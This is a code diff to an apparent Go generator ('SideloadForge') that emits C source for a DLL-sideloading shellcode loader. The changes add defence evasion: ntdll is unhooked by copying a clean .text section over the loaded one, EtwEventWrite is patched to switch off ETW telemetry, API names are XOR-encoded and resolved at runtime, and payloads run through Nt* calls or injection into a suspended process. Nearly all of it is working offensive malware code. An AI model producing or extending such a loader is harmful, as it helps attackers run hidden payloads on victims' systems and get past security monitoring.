@@ -165,12 +165,18 @@ type apiDef struct {
 	Var     string
 }
 
-// apiDefs are the Windows APIs the loader resolves at runtime by hash, so their
-// names do not appear as plaintext import strings.
-var apiDefs = []apiDef{
+// k32Defs are the kernel32 APIs the loader resolves at runtime (unhook/ETW-patch
+// support plus the process-injection path). Their names never appear as plaintext
+// import strings.
+var k32Defs = []apiDef{
+	{"GetModuleHandleA", "typedef HMODULE (WINAPI *t_GetModuleHandleA)(LPCSTR);", "g_GetModuleHandleA"},
+	{"CreateFileA", "typedef HANDLE (WINAPI *t_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);", "g_CreateFileA"},
+	{"ReadFile", "typedef BOOL (WINAPI *t_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);", "g_ReadFile"},
+	{"GetFileSize", "typedef DWORD (WINAPI *t_GetFileSize)(HANDLE, LPDWORD);", "g_GetFileSize"},
+	{"CloseHandle", "typedef BOOL (WINAPI *t_CloseHandle)(HANDLE);", "g_CloseHandle"},
+	{"VirtualFree", "typedef BOOL (WINAPI *t_VirtualFree)(LPVOID, SIZE_T, DWORD);", "g_VirtualFree"},
 	{"VirtualAlloc", "typedef LPVOID (WINAPI *t_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);", "g_VirtualAlloc"},
 	{"VirtualProtect", "typedef BOOL (WINAPI *t_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);", "g_VirtualProtect"},
-	{"CreateThread", "typedef HANDLE (WINAPI *t_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);", "g_CreateThread"},
 	{"Sleep", "typedef VOID (WINAPI *t_Sleep)(DWORD);", "g_Sleep"},
 	{"CreateProcessW", "typedef BOOL (WINAPI *t_CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);", "g_CreateProcessW"},
 	{"VirtualAllocEx", "typedef LPVOID (WINAPI *t_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);", "g_VirtualAllocEx"},
@@ -180,10 +186,19 @@ var apiDefs = []apiDef{
 	{"ResumeThread", "typedef DWORD (WINAPI *t_ResumeThread)(HANDLE);", "g_ResumeThread"},
 }
 
-// writeAPIResolution emits typedefs, XOR-encoded API name arrays, a resolve
-// helper, and an init_apis() function so the loader resolves VirtualAlloc /
-// VirtualProtect / CreateThread / Sleep via GetProcAddress instead of importing
-// them by name.
+// ntdllDefs are the syscall-level APIs used for the self-injection path. They are
+// resolved AFTER ntdll is unhooked so the resolved addresses point at clean code.
+var ntdllDefs = []apiDef{
+	{"NtAllocateVirtualMemory", "typedef NTSTATUS (WINAPI *t_NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);", "g_NtAllocateVirtualMemory"},
+	{"NtProtectVirtualMemory", "typedef NTSTATUS (WINAPI *t_NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);", "g_NtProtectVirtualMemory"},
+	{"NtCreateThreadEx", "typedef NTSTATUS (WINAPI *t_NtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);", "g_NtCreateThreadEx"},
+	{"NtDelayExecution", "typedef NTSTATUS (WINAPI *t_NtDelayExecution)(BOOLEAN, PLARGE_INTEGER);", "g_NtDelayExecution"},
+	{"EtwEventWrite", "typedef ULONG (WINAPI *t_EtwEventWrite)(LPVOID, LPVOID, ULONG, LPVOID);", "g_EtwEventWrite"},
+}
+
+// writeAPIResolution emits typedefs, XOR-encoded API name arrays, resolve helpers,
+// init_apis_k32/ntdll, plus unhook_ntdll() and patch_etw(). Every Windows API is
+// resolved via GetProcAddress so none appears as a plaintext import.
 func writeAPIResolution(sb *strings.Builder) {
 	key := byte(0)
 	for key == 0 {
@@ -193,11 +208,17 @@ func writeAPIResolution(sb *strings.Builder) {
 	}
 
 	sb.WriteString("/* ---- runtime API resolution ---- */\n")
-	for _, d := range apiDefs {
+	for _, d := range k32Defs {
+		sb.WriteString(d.Typedef + "\n")
+	}
+	for _, d := range ntdllDefs {
 		sb.WriteString(d.Typedef + "\n")
 	}
 	sb.WriteString("\n")
-	for _, d := range apiDefs {
+	for _, d := range k32Defs {
+		fmt.Fprintf(sb, "static %s %s;\n", "t_"+d.Name, d.Var)
+	}
+	for _, d := range ntdllDefs {
 		fmt.Fprintf(sb, "static %s %s;\n", "t_"+d.Name, d.Var)
 	}
 	sb.WriteString("\n")
@@ -213,21 +234,88 @@ func writeAPIResolution(sb *strings.Builder) {
 	sb.WriteString("    return GetProcAddress(m, name);\n")
 	sb.WriteString("}\n\n")
 
-	// encoded "kernel32.dll"
+	// encoded module names + API names
 	writeEncodedName(sb, "k32_name", "kernel32.dll", key)
-	for _, d := range apiDefs {
+	writeEncodedName(sb, "ntdll_name", "ntdll.dll", key)
+	for _, d := range k32Defs {
+		writeEncodedName(sb, d.Var+"_enc", d.Name, key)
+	}
+	for _, d := range ntdllDefs {
 		writeEncodedName(sb, d.Var+"_enc", d.Name, key)
 	}
 
-	fmt.Fprintf(sb, "static void init_apis(void) {\n")
+	// resolve kernel32 APIs
+	fmt.Fprintf(sb, "static void init_apis_k32(void) {\n")
 	fmt.Fprintf(sb, "    char name[96];\n")
-	fmt.Fprintf(sb, "    HMODULE k32;\n")
+	fmt.Fprintf(sb, "    HMODULE m;\n")
 	fmt.Fprintf(sb, "    decode_str(name, k32_name, sizeof(k32_name)-1, 0x%02x);\n", key)
-	sb.WriteString("    k32 = LoadLibraryA(name);\n")
-	sb.WriteString("    if (!k32) return;\n")
-	for _, d := range apiDefs {
-		fmt.Fprintf(sb, "    %s = (t_%s)resolve_api(k32, %s_enc, sizeof(%s_enc)-1, 0x%02x);\n", d.Var, d.Name, d.Var, d.Var, key)
+	sb.WriteString("    m = LoadLibraryA(name);\n")
+	sb.WriteString("    if (!m) return;\n")
+	for _, d := range k32Defs {
+		fmt.Fprintf(sb, "    %s = (t_%s)resolve_api(m, %s_enc, sizeof(%s_enc)-1, 0x%02x);\n", d.Var, d.Name, d.Var, d.Var, key)
 	}
+	sb.WriteString("}\n\n")
+
+	// resolve ntdll APIs (call AFTER unhook_ntdll so addresses are clean)
+	fmt.Fprintf(sb, "static void init_apis_ntdll(void) {\n")
+	fmt.Fprintf(sb, "    char name[96];\n")
+	fmt.Fprintf(sb, "    HMODULE m;\n")
+	fmt.Fprintf(sb, "    decode_str(name, ntdll_name, sizeof(ntdll_name)-1, 0x%02x);\n", key)
+	sb.WriteString("    m = LoadLibraryA(name);\n")
+	sb.WriteString("    if (!m) return;\n")
+	for _, d := range ntdllDefs {
+		fmt.Fprintf(sb, "    %s = (t_%s)resolve_api(m, %s_enc, sizeof(%s_enc)-1, 0x%02x);\n", d.Var, d.Name, d.Var, d.Var, key)
+	}
+	sb.WriteString("}\n\n")
+
+	// unhook_ntdll: refresh ntdll .text from a clean on-disk copy (removes EDR
+	// inline hooks on the Nt* syscall stubs).
+	sb.WriteString("static void unhook_ntdll(void) {\n")
+	sb.WriteString("    unsigned char *base;\n")
+	sb.WriteString("    IMAGE_DOS_HEADER *dos; IMAGE_NT_HEADERS *nt; IMAGE_SECTION_HEADER *sec;\n")
+	sb.WriteString("    unsigned char *clean; HANDLE f; DWORD fsz, rd, oldp; unsigned int i;\n")
+	fmt.Fprintf(sb, "    { char n[96]; decode_str(n, ntdll_name, sizeof(ntdll_name)-1, 0x%02x); base = (unsigned char*)g_GetModuleHandleA(n); }\n", key)
+	sb.WriteString("    if (!base) return;\n")
+	sb.WriteString("    dos = (IMAGE_DOS_HEADER*)base;\n")
+	sb.WriteString("    if (dos->e_magic != 0x5A4D) return;\n")
+	sb.WriteString("    nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);\n")
+	sb.WriteString("    sec = IMAGE_FIRST_SECTION(nt);\n")
+	sb.WriteString("    for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {\n")
+	sb.WriteString("        if (sec->Name[0]=='.' && sec->Name[1]=='t' && sec->Name[2]=='e' && sec->Name[3]=='x' && sec->Name[4]=='t') break;\n")
+	sb.WriteString("    }\n")
+	sb.WriteString("    if (i == nt->FileHeader.NumberOfSections) return;\n")
+	sb.WriteString("    f = g_CreateFileA(\"C:/Windows/System32/ntdll.dll\", 0x80000000, 1, NULL, 3, 0x80, NULL);\n")
+	sb.WriteString("    if (f == INVALID_HANDLE_VALUE) return;\n")
+	sb.WriteString("    fsz = g_GetFileSize(f, NULL);\n")
+	sb.WriteString("    clean = (unsigned char*)g_VirtualAlloc(NULL, fsz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n")
+	sb.WriteString("    if (!clean) { g_CloseHandle(f); return; }\n")
+	sb.WriteString("    rd = 0; g_ReadFile(f, clean, fsz, &rd, NULL); g_CloseHandle(f);\n")
+	sb.WriteString("    {\n")
+	sb.WriteString("        IMAGE_DOS_HEADER *cdos = (IMAGE_DOS_HEADER*)clean;\n")
+	sb.WriteString("        IMAGE_NT_HEADERS *cnt = (IMAGE_NT_HEADERS*)(clean + cdos->e_lfanew);\n")
+	sb.WriteString("        IMAGE_SECTION_HEADER *csec = IMAGE_FIRST_SECTION(cnt); unsigned int j;\n")
+	sb.WriteString("        for (j = 0; j < cnt->FileHeader.NumberOfSections; j++, csec++) {\n")
+	sb.WriteString("            if (csec->Name[0]=='.' && csec->Name[1]=='t' && csec->Name[2]=='e' && csec->Name[3]=='x' && csec->Name[4]=='t') break;\n")
+	sb.WriteString("        }\n")
+	sb.WriteString("        if (j < cnt->FileHeader.NumberOfSections) {\n")
+	sb.WriteString("            oldp = 0;\n")
+	sb.WriteString("            g_VirtualProtect(base + sec->VirtualAddress, sec->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldp);\n")
+	sb.WriteString("            for (i = 0; i < csec->SizeOfRawData; i++) base[sec->VirtualAddress + i] = clean[csec->PointerToRawData + i];\n")
+	sb.WriteString("            g_VirtualProtect(base + sec->VirtualAddress, sec->Misc.VirtualSize, oldp, &oldp);\n")
+	sb.WriteString("        }\n")
+	sb.WriteString("    }\n")
+	sb.WriteString("    g_VirtualFree(clean, 0, MEM_RELEASE);\n")
+	sb.WriteString("}\n\n")
+
+	// patch_etw: make EtwEventWrite return immediately (disable ETW telemetry)
+	sb.WriteString("static void patch_etw(void) {\n")
+	sb.WriteString("    DWORD oldp;\n")
+	sb.WriteString("    if (!g_EtwEventWrite) return;\n")
+	sb.WriteString("    g_VirtualProtect((LPVOID)g_EtwEventWrite, 3, PAGE_EXECUTE_READWRITE, &oldp);\n")
+	sb.WriteString("    ((unsigned char*)g_EtwEventWrite)[0] = 0x31; /* xor eax,eax */\n")
+	sb.WriteString("    ((unsigned char*)g_EtwEventWrite)[1] = 0xC0;\n")
+	sb.WriteString("    ((unsigned char*)g_EtwEventWrite)[2] = 0xC3; /* ret */\n")
+	sb.WriteString("    g_VirtualProtect((LPVOID)g_EtwEventWrite, 3, oldp, &oldp);\n")
 	sb.WriteString("}\n\n")
 }
 
@@ -247,7 +335,8 @@ func writeEncodedName(sb *strings.Builder, varName, s string, key byte) {
 func genC(payload, key []byte, renameBase, mode string, sleepMs int, inject bool, targetExe string) string {
 	var sb strings.Builder
 	sb.WriteString("/* proxy.c - generated by SideloadForge (C2-agnostic) */\n")
-	sb.WriteString("#include <windows.h>\n\n")
+	sb.WriteString("#include <windows.h>\n")
+	sb.WriteString("typedef LONG NTSTATUS;\n\n")
 
 	sb.WriteString("unsigned char payload[] = {\n  ")
 	writeByteArray(&sb, payload)
@@ -292,7 +381,7 @@ func genC(payload, key []byte, renameBase, mode string, sleepMs int, inject bool
 		sb.WriteString("    decode();\n")
 	}
 	if sleepMs > 0 {
-		fmt.Fprintf(&sb, "    g_Sleep(%d);\n", sleepMs)
+		sb.WriteString("    { LARGE_INTEGER d; d.QuadPart = -(LONGLONG)" + fmt.Sprintf("%d", sleepMs) + " * 10000LL; g_NtDelayExecution(FALSE, &d); }\n")
 	}
 	if inject {
 		// process injection: spawn a suspended process and run shellcode there
@@ -313,11 +402,13 @@ func genC(payload, key []byte, renameBase, mode string, sleepMs int, inject bool
 		sb.WriteString("        g_ResumeThread(pi.hThread);\n")
 		sb.WriteString("    }\n")
 	} else {
-		sb.WriteString("    LPVOID mem = g_VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n")
-		sb.WriteString("    if (mem) {\n")
+		sb.WriteString("    void *mem = NULL;\n")
+		sb.WriteString("    SIZE_T sz = payload_len;\n")
+		sb.WriteString("    if (g_NtAllocateVirtualMemory((HANDLE)-1, &mem, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) == 0 && mem) {\n")
 		sb.WriteString("        for (unsigned int i = 0; i < payload_len; i++) ((unsigned char*)mem)[i] = payload[i];\n")
-		sb.WriteString("        DWORD oldProtect;\n")
-		sb.WriteString("        g_VirtualProtect(mem, payload_len, PAGE_EXECUTE_READ, &oldProtect);\n")
+		sb.WriteString("        ULONG oldProtect;\n")
+		sb.WriteString("        sz = payload_len;\n")
+		sb.WriteString("        g_NtProtectVirtualMemory((HANDLE)-1, &mem, &sz, PAGE_EXECUTE_READ, &oldProtect);\n")
 		sb.WriteString("        ((void(*)())mem)();\n")
 		sb.WriteString("    }\n")
 	}
@@ -328,12 +419,15 @@ func genC(payload, key []byte, renameBase, mode string, sleepMs int, inject bool
 	}
 	sb.WriteString("BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {\n")
 	sb.WriteString("    if (fdwReason == DLL_PROCESS_ATTACH) {\n")
-	sb.WriteString("        init_apis();\n")
+	sb.WriteString("        init_apis_k32();\n")
+	sb.WriteString("        unhook_ntdll();\n")
+	sb.WriteString("        init_apis_ntdll();\n")
+	sb.WriteString("        patch_etw();\n")
 	if renameBase != "" {
 		sb.WriteString("        decode_name();\n")
 		sb.WriteString("        LoadLibraryA((char*)orig_name);\n")
 	}
-	sb.WriteString("        g_CreateThread(NULL, 0, run, NULL, 0, NULL);\n")
+	sb.WriteString("        { HANDLE th = NULL; g_NtCreateThreadEx(&th, 0x1FFFFF, NULL, (HANDLE)-1, (PVOID)run, NULL, 0, 0, 0, 0, NULL); }\n")
 	sb.WriteString("    }\n")
 	sb.WriteString("    return TRUE;\n")
 	sb.WriteString("}\n")
